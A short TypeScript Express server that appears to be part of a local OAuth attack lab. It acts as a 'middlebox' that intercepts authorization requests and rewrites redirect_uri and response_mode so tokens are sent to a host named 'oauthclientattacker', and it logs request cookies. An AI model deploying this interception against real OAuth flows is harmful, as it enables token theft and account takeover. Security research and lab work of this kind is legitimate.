// import express from "express";

// const app = express();

// app.get("/oauth/authorize", (req, res) => {
//     console.log("🔀 middlebox intercepted:", req.query);

//     // forward original params unchanged — attacker will inject redirect_uri + response_mode
//     const params = new URLSearchParams(req.query as Record<string, string>);

//     const attackerUrl = `http://oauthclientattacker:3003/oauth/authorize?${params}`;
//     console.log("🔀 routing to attacker:", attackerUrl);

//     res.send(`
//         <!DOCTYPE html><html><body>
//         <script>
//             window.location.href = ${JSON.stringify(attackerUrl)};
//         </script>
//         </body></html>
//     `);
// });

// app.listen(8080, () => console.log("🔀 middlebox running on :8080"));



import express from "express";

const app = express();

app.get("/oauth/authorize", (req, res) => {
    const { redirect_uri, response_mode, ...rest } = req.query as Record<string, string>;

    console.log(req.cookies)

    const isPopup = !req.headers["sec-fetch-user"]; // absent = programmatic open

    console.log("sec-fetch-user:", req.headers["sec-fetch-user"]);
    console.log("isPopup:", isPopup);

    if (response_mode == "web_message") {
        console.log("webmessage???")
        console.log("webmessage???")
        console.log("webmessage???")
        const params = new URLSearchParams({
            redirect_uri: redirect_uri as string,
            response_mode: "web_message",
            ...rest
        });
        res.redirect(`http://oauthclientattacker:3003/oauth/authorize?${params}`);
    } else {
        const params = new URLSearchParams({
            redirect_uri: "http://oauthclientattacker:3003",
            response_mode: "fragment",
            ...rest
        });
        res.redirect(`http://oauthserver:3001/oauth/authorize?${params}`);
    }
});


app.listen(8080, () => console.log("Middlebox running on :8080"));
